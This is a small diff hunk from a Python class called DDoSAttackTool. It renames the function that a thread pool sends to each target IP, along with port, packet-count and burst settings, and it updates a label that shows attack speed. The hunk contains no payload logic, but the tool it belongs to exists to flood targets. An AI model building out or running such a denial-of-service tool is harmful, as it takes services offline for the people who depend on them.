@@ -104,7 +104,7 @@ class DDoSAttackTool:
             for target in target_ips:
                 if self.stop_attack_flag:
                     break
-                executor.submit(attack_function, target, port, num_packets, burst_interval)
+                executor.submit(attack_vector, target, port, num_packets, burst_interval)
                 time.sleep(1)  
 
                 self.attack_speed_label.config(text=f"Attack Speed: {self.get_attack_speed():.2f} GB/s")
